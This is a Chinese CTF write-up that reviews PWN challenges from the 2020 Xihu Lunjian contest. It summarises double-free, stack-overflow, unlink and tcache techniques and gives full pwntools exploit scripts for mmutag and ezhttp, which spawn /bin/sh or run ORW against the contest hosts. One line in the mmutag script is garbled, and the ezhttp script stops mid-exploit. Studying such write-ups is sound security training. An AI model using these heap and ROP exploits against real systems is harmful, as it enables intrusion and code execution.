# 2020 西湖论剑部分PWN题复盘
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 summary
**mmutage** ：两个洞一个double free和栈溢出，栈溢出后面接一个输出可以leak canary，由于给了栈地址并且可以edit
stack所以可以double free改fd到stack上，这样就可以rop先泄漏libc，然后再csu来call
read到ret位置写入system(“/bin/sh”)来getshell。
**noleakfmt**
：看到stdout结构体的地址在当前printf栈地址的上面，这里第一步改双链位置上的stack值到程序地址的地方，我们第一步改printf返回地址为start抬高栈地址。后面就可以改stdout的file结构体的fileno为2就可以成功输出了。
**managesystem** ：32位的mips堆题，有个heapoveflow的漏洞，可以利用unlink劫持note_list进行leak
libc并劫持got表。
**ezhttp** :模拟http请求，2.27 double free, 劫持hook为setcontext+53进行orw
## 0x02 mmutag
###  查看文件
got表可劫持，PIE没开
###  IDA分析
给了个栈地址：
double free：
栈溢出：
###  思路
利用栈溢出打印出canary，double
free改fd劫持stack，写rop一个是泄露libc’地址，再一个是改got表，csu再写入rsp，执行system(“/bin/sh”)进行getshell即可
###  exp
    # coding=utf-8
    from pwn import *
    context.update(arch="amd64",os="linux",log_level="debug")
    context.terminal = ['tmux', 'split', '-h']
    debug = 1
    if debug:
        p = process("./mmutag")
        elf = ELF("./mmutag")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    else:
        p = remote('183.129.189.62', 58704)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        elf = ELF("./mmutag")
        one_gadget = 0x0
    def myIntroduce(introduce):
        p.sendlineafter("input your choice:\n\n", "1")
        p.sendafter("your introduce \n", introduce)
    def introduce():
        p.sendlineafter("input your choice:\n\n", "2")
    def create(index, content):
        p.sendlineafter("your choise:\n", "1")
        p.sendlineafter("your id:\n", str(index))
        p.sendafter("your content\n", content)
    def delete(index):
        p.sendlineafter("your choise:\n", "2")
        p.sendlineafter("your id:\n", str(index))
    def stackSend(content):
        p.sendlineafter("input your choice:\n\n", "2")
        p.sendlineafter("your choise:\n", "3")
        p.send(content)
    def exit():
        p.sendlineafter("your choise:\n","4")
    pop_rdi_ret = 0x0000000000400d23
    pop_r12_r13_r14_r15_ret = 0x0000000000400d1c # 0x0000000000400d1c: pop r12; pop r13; pop r14; pop r15; ret;
    p.recvuntil("input you name: \n")
    p.sendline("blueSheep\n")
    p.recvuntil("your tag: 0x")
    stack_address = int(p.recv(12),16)
    success("stack address ==> "+hex(stack_address))
    myIntroduce(p64(0x71))
    stackSend("a"*0x19)
    p.recvuntil("content: ")
    p.recvuntil("a"*0x18)
    canary = u64(p.recv(8))
    canary = (canary >> 8)  "+hex(canary))
    p.sendlineafter("your choise:\n", "3")
    p.send(p64(0)+p64(0x71)+p64(0)+"\x00")
    create(1,"\n")
    create(2,"\n")
    delete(1)
    delete(2)
    delete(1)
    create(3,p64(stack_address - 0x40))
    create(4,"\n")
    create(5,"\n")
    payload = flat([
        0,canary,stack_address+0x10,
        pop_rdi_ret,elf.got['puts'],
        elf.plt['puts'],pop_r12_r13_r14_r15_ret,
        elf.got['read'],0x80,stack_address+0x28,0,0x400d00])
    create(6,payload)
    p.sendlineafter("your choise:\n","4")
    libc.address = u64(p.recv(6).ljust(8,"\x00"))-libc.sym['puts']
    success("libc address ==> "+hex(libc.address))
    p.send(p64(pop_rdi_ret)+p64(libc.search("/bin/sh").next())+p64(libc.sym['system']))
    p.interactive()
## 0x03 ezhttp
###  查看文件
###  IDA分析
这道题是一道模拟http请求的题目，功能参数都通过packet传递，同时一些验证字符也需要按照解析格式放在数据包内一并传递。需要耐心解析数据包格式，较繁琐。
最后检查密码的地方不用管，看汇编可以理解，result恒不为0。
数据格式大致是：
     28     payload = "POST "
     29     payload+= command
     30     payload+= " Cookie: "
     31     payload+= "user"
     32     payload+= "="
     33     payload+= "admin"
     34     payload+= "token: "
     35     payload+= "\r\n\r\n"
     36     payload+= content
接下来就是三个功能：create、delete和edit。create会直接给出heap地址，free中有double
free，没有show。这道题目开启了沙箱，只能考虑orw来获得flag。
###  思路
double free劫持tcache pthread header，通过io来进行leak
libc，然后改hook为setcontext+53劫持stack esp指针，之后会跳转到提前布置的rop中执行ORW来获得flag
由于create通过\x00来算size，所以我们需要分开写，第一次写flag，第二次写write_base
###  exp
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='debug')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./ezhttp')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    if debug:
        p = process('./ezhttp')
        # p = process('./ezhttp',env={'LD_PRELOAD':'./libc-2.27.so'})
    else:
        p = remote('183.129.189.61',51302)
    def makePacket(command,content):
        payload = "POST "
        payload+= command
        payload+= " Cookie: "
        payload+= "user"
        payload+= "="
        payload+= "admin"
        payload+= "token: "
        payload+= "\r\n\r\n"
        payload+= content
        return payload
    def create(content='a\x00'):
        payload = "content="
        payload += content
        sendPacket(makePacket("/create",payload))
    def delete(idx):
        payload = "index="
        payload += str(idx)
        sendPacket(makePacket("/del",payload))
    def edit(idx,content):
        payload = "index="
        payload += str(idx)
        payload += "&content="
        payload += content
        payload += '\n'
        sendPacket(makePacket("/edit",payload))
    def sendPacket(content):
        p.sendafter("======= Send Http packet to me: ========",content)
    #gdb.attach(p,"b *0x555555554000+0xf9d")
    create("a"*0x100+"\x00") # 0
    p.recvuntil("Your gift: 0x")
    heap_base = int(p.recv(12),16)-0x260
    success("heap base ==> "+hex(heap_base))
    create("b"*0x100+"\x00") # 1
    create("c"*0x100+"\x00") # 2
    create("d"*0x100+"\x00") # 3
    create("e"*0x18+"\x00") # 4
    delete(4)
    for i in range(7):
        delete(0)
    delete(1)
    create("a"*0x100+"\x00") # 5
    edit(5,p64(heap_base+0x10))
    create("a"*0x100+"\x00") # 6
    create("\x07"*0x100+"\x00") # 7
    edit(7,"\x07"*0x40+p64(0x370+heap_base)) # 7
    create("\x60\x07\xdd") # 8
    edit(7,"\x07"*0x40+p64(0x370+heap_base))
    create("\x00") # 9
    create(p64(0xfbad1877)) # 10  io_stdout->flag
    edit(7,"\x07"*0x40+p64(0x370+heap_base))
    edit(8,"\x80\x07\xdd")
    create("\x00") # 11
    create("a\x00") # 12   io_stdout->write_base
    edit(10,p64(0xfbad1800)[:4])
    edit(12,"\x00")
    p.recvn(0x68)
    libc.address = u64(p.recvn(8))-libc.sym['_IO_2_1_stdout_'] -131
    success("libc adddress ==> "+hex(libc.address))
    syscall = 0x00000000000d29d5+libc.address
    pop_rax = 0x43a78+libc.address
    pop_rsi = 0x23e8a+libc.address
    pop_rdi = 0x2155f+libc.address
    pop_rdx = 0x1b96+libc.address
    edit(7,"\x07"*0x40+p64(libc.sym['__free_hook']))
    create(p64(libc.address+0x52145)[:6])